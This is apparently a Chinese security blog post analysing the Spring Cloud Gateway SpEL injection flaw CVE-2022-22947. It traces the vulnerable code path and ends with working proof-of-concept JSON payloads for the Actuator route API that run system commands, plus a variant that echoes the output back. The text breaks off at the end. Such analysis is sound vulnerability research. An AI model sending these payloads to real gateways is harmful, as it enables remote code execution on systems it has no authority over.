---
title: 原创 | Spring Cloud GateWay CVE-2022-22947 SPEL RCE
url: https://mp.weixin.qq.com/s?__biz=MzI4Mzc0MTI0Mw==&mid=2247496882&idx=2&sn=5917f507d1ac6758629f5e6727d5c3fc&chksm=eb84a9e6dcf320f0782a15ccc4f88e91c949b37d4bb43f5ff87704d605c98fa8f4f0f6aeee81&scene=58&subscene=0#rd
source: SecIN技术平台
date: 2023-03-30
fetch_date: 2025-10-04T11:08:11.531093
---

# 原创 | Spring Cloud GateWay CVE-2022-22947 SPEL RCE

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYpqFeicvxYGiaGgRt9ZjYicBiabE6v4PuE2uvz8kBcLPJj4bM2SUQPlhp72C94SqqQ5MMzUiczEc1iaW84AQ/0?wx_fmt=jpeg)

# 原创 | Spring Cloud GateWay CVE-2022-22947 SPEL RCE

原创

Whippet

SecIN技术平台

**点击蓝字**

**关注我们**

# **漏洞简介**

Spring Cloud Gateway是Spring Cloud官方推出的第二代网关框架，取代Zuul网关。网关作为流量的，在微服务系统中有着非常作用，网关常见的功能有路由转发、权限校验、限流控制等作用。当启用、暴露和不安全的 Gateway Actuator 端点时，使用 Spring Cloud Gateway 的应用程序容易受到代码注入攻击。远程攻击者可以发出恶意制作的请求，允许在远程主机上进行任意远程执行。

# **影响版本**

* Spring Cloud Gateway

+ 3.1.0
+ 3.0.0 to 3.0.6
+ 旧的不受支持的版本

#

# **漏洞分析**

### Predicate

## 通过 github 上的 commits 记录，定位到漏洞修补代码 如果想要利用 github 比较两个版本的差异，可以构造链接

## `https://github.com/spring-cloud/spring-cloud-gateway/compare/v3.1.0...v3.1.1?diff=split`

![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYpqFeicvxYGiaGgRt9ZjYicBiabE9BLibdR4DA8JzZRXicU8naKBmia4tibib6QoSQ3pzZQFk3jU8YpB166BmRA/640?wx_fmt=jpeg)

`spring-cloud-gateway-server/src/main/java/org/springframework/cloud/gateway/support/ShortcutConfigurable.java#getValue`中利用 `GatewayEvaluationContext` 替换了原本的 `StandardEvaluationContext`来执行spel 表达式

![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYpqFeicvxYGiaGgRt9ZjYicBiabEUsPwickddXG85r4at1uJhgkO9JDDzylYibCbPTeTYW7ammyKbDAfVAbg/640?wx_fmt=jpeg)

`GatewayEvaluationContext` 实际上调用的是 `SimpleEvaluationContext`方法

`StandardEvaluationContext` 和 `SimpleEvaluationContext`都是执行 Spring 的 SpEL 表达式的接口。

##

SpEL 提供的两个 EvaluationContext ，区别如下：

* SimpleEvaluationContext

  -针对不需要 SpEL 语言语法的全部范围并且应该受到有意限制的表达式类别，公开 SpEL 语言特性和配置选项的子集。
* StandardEvaluationContext

  - 公开全套 SpEL 语言功能和配置选项。您可以使用它来指定默认的根对象并配置每个可用的评估相关策略。

`SimpleEvaluationContext` 旨在仅支持 SpEL 语言语法的一个子集。它不包括 Java类型引用、构造函数 和 bean引用。所以说指定正确 EvaluationContext ，是防止SpEl表达式注入漏洞产生的首选。

因为采用 `StandardEvaluationContext` 而产生的 SpEL 注入 也存在历史漏洞 CVE-2018-1273

对 SpEL 的深入了解可以查看这篇文章 SpEL injection

我们下载 3.1.0 的代码 进行分析，定位到漏洞触发点

org.springframework.cloud.gateway.support.ShortcutConfigurable#getValue

![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYpqFeicvxYGiaGgRt9ZjYicBiabEP00gInwUtwqGLFLWCMJicMgtu9GZuLaoMgTo04dILjicg6H5DsgArWbw/640?wx_fmt=jpeg)

可以看到判断 rawValue 的值不为空且以 `#{` 为开头 `}` 为结尾时，会进入到不安全的 SpEL 解析方法。

寻找调用 `getValue` 的位置，四处均在 `ShortcutConfigurable` 的接口类中的 枚举类`ShortcutType` 中

## ![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYpqFeicvxYGiaGgRt9ZjYicBiabEUJic1p5MI1TfaUh3NRZxgpicH2dZrSIre7ConcoV7L0ycNEHxsHrObrw/640?wx_fmt=jpeg)

枚举类`ShortcutType` 的三个枚举值中重写了 `normalize`方法

`org.springframework.cloud.gateway.support.ShortcutConfigurable.ShortcutType#normalize`

##

![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYpqFeicvxYGiaGgRt9ZjYicBiabEibico0kjaw5Zyc9wIx1aV7bQJnCNmWdeBqHZrWxiayv2iaKaQ5CFY4Il9Q/640?wx_fmt=jpeg)

全局搜索 `ShortcutType`找出其中调用 `normalize` 方法

![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYpqFeicvxYGiaGgRt9ZjYicBiabEVGvSRF2lichxk6bsd8aeT5QWiabI7pWo4OmuzUgicdcSDpf1xNib8wXq6g/640?wx_fmt=jpeg)

## org.springframework.cloud.gateway.support.ConfigurationService.ConfigurableBuilder#normalizeProperties![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYpqFeicvxYGiaGgRt9ZjYicBiabEPffW7vbSMZ8Wib7O0ku3sKOYHPUicxiaJmpAxu4PNZ9DPeqfumdop2YicA/640?wx_fmt=jpeg)

通过分析代码可知 `normalizeProperties` 中所对应的 `this.properties` 就对应着最终 SpEL 表达式中的内容

`normalizeProperties` 是对 filter 的属性进行解析，会将 filter 的配置属性传入 `normalize` 中，最后进入 getValue 执行 SpEL 表达式造成 SpEL 表达式注入。

向上寻找 `normalizeProperties` 的调用

`org.springframework.cloud.gateway.support.ConfigurationService.AbstractBuilder#bind`

![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYpqFeicvxYGiaGgRt9ZjYicBiabEzTRtDW0tiaGNom21VBjGLhmH7CibB1ouUSXicicWkia44dHBWKicia16ySQag/640?wx_fmt=jpeg)

org.springframework.cloud.gateway.route.RouteDefinitionRouteLocator#lookup

![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYpqFeicvxYGiaGgRt9ZjYicBiabEU8sIbHOV218baADZwgkKpv4Y7kA0lbhgYicvFDTBibf2q2t35yNfzOMg/640?wx_fmt=jpeg)

`properties` 的值由 `predicate.getArgs()`赋予

`org.springframework.cloud.gateway.route.RouteDefinitionRouteLocator#combinePredicates`![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYpqFeicvxYGiaGgRt9ZjYicBiabEIafDWUvEmrmyXRSjUmbafaicAKTLTt5alax3YhyT70WUdXjyLmndXxQ/640?wx_fmt=jpeg)

最后的触发与路由对应的 Predicate 有关，spring cloud gateway 通过谓词（Predicate）来匹配来自用户的请求，不同的谓词对应着不同的效果。

我们在配置文件中添加对应的 SpEL 表达式就可以触发漏洞

![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYpqFeicvxYGiaGgRt9ZjYicBiabEP8vA2dtuPVffpNEAfCt8ZJsMbL2iblVkhaMhmmqs0oRHSmCyYGcv2Bg/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYpqFeicvxYGiaGgRt9ZjYicBiabEDs6ib5xnxdEoibzRqfjia3aIfV6EXomaB23RpJz4ibOm5V9DEW28TkInHQ/640?wx_fmt=jpeg)

## 但是通过修改配置文件能叫 RCE 吗

![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYpqFeicvxYGiaGgRt9ZjYicBiabE50cq5eJsoeXgThKianyzwKDHSu8lGTXO4Nq8z6iaibicdBeZXoVvGRShEw/640?wx_fmt=jpeg)

## 所以还是要正向分析，spring-cloud-gateway 可以通过 Actuator API 在网关中创建和删除路由

![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYpqFeicvxYGiaGgRt9ZjYicBiabE9RwD3icrUib7YhqP4ft7s5eBIfBVBia3uXIyHNthUBhrbelicENEr5E5bw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYpqFeicvxYGiaGgRt9ZjYicBiabEdgxZz8BJ5OQh1jnSkSIFvxWVWkZGPgFiap6WunKkhPBxK1jcVChNqdQ/640?wx_fmt=jpeg)

```
{  "id": "first_route",  "predicates": [{    "name": "Path",    "args": {"_genkey_0":"#{T(java.lang.Runtime).getRuntime().exec(\"calc.exe\")}"}  }],  "filters": [],  "uri": "https://www.uri-destination.org",  "order": 0}
```

添加路由信息完成后，还需要进行刷新![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYpqFeicvxYGiaGgRt9ZjYicBiabEa8VhuvBDQE5BqkSBlOr76nXaY4Kx7vZjF4o5G9zJrKzMMLJOzgADxw/640?wx_fmt=jpeg)

```
http://127.0.0.1:8080/actuator/gateway/refresh
```

回显方法

```
{  "id": "first_route",  "predicates": [{    "name": "Path",    "args": {"_genkey_0":"#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"whoami\"}).getInputStream()))}"}  }],  "filters": [],  "uri": "https://www.uri-destination.org",  "order": 0}
```

### Filters

在另一条链路中发现，通过路由对应的 Filters 也是可以触发漏洞org.springframework.cloud.gateway.route.RouteDefinitionRouteLocator#loadGatewayFilters

![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYpqFeicvxYGiaGgRt9ZjYicBiabEMvEVekEVtFkPXGicn77dsDGrPjNmQXSL4qsvIfIj9Rw1BnUaDJgFX1w/640?wx_fmt=jpeg)org.springframework.cloud.gateway.route.RouteDefinitionRouteLocator#getFilters

![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYpqFeicvxYGiaGgRt9ZjYicBiabEgfcSVHUawAO2QyrsicicG5XuouYT6Avt5vpxbMz17IOLRCyViaTMdZibyg/640?wx_fmt=jpeg)

所以通过构造这样的 poc 也是可以的

```
{"id":"first_route","predicates": [],"filters":[    {        "name":"RewritePath",        "args":{                "test":"#{T(java.lang.Runtime).getRuntime().exec(\"calc.exe\")}"    }    }],  "uri": "https://www.uri-destination.org",  "order": 0}
```

详细分析一下为什么需要如此构造

org.springframework.cloud.gateway.actuate.AbstractGatewayControllerEndpoint#save![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYpqFeicvxYGiaGgRt9ZjYicBiabEDm10A9HsnP6y3Zn7HfsRVGS9YvXn34YtKPC5IFZ6qKiaW54TcoJHQUQ/640?wx_fmt=jpeg)

添加路由时会调用

`validateRouteDefinition`org.springframework.cloud.gateway.actuate.AbstractGatewayControllerEndpoint#validateRouteDefinition

![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYpqFeicvxYGiaGgRt9ZjYicBiabEeGYLmKSKjnWPA1UBecQcgpbDJKFKWFC04sYjIVk975yOJbZiacbeCkQ/640?wx_fmt=jpeg)org.springframework.cloud.gateway.actuate.AbstractGatewayControllerEndpoint#isAvailable(org.springframework.cloud.gateway.filter.FilterDefinition)

![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYpqFeicvxYGiaGgRt9ZjYicBiabEicCiaMcjiccC8HHST8ibE8A8mf5qZOzyEibq7djJicHOVDMUlliaQs5tz5ohw/640?wx_fmt=jpeg)

会判断 Filters 对应的 name 是否存在

* anyMatch：判断的条件里，任意一个元素成功，返回true
* allMatch：判断条件里的元素，所有的都是，返回true
* noneMatch：与allMatch相反，判断条件里的元素，所有的都不是，返回true

```
for(int i=0;i<this.GatewayFilters.size();i++){     System.out.println(GatewayFilters.get(i).name()); }
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYpqFeicvxYGiaGgRt9ZjYicBiabEU3lnGHBPicXUkIlUs9jmejb3iaicDZZZlbvB3L6g7JlhsYURVEUWy3AAQ/640?wx_fmt=jpeg)

name 满足其中的任意一个都是可以的

回显方法

org.springframework.cloud.gateway.filter.factory.AddResponseHeaderGatewayFilterFactory

![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYpqFeicvxY...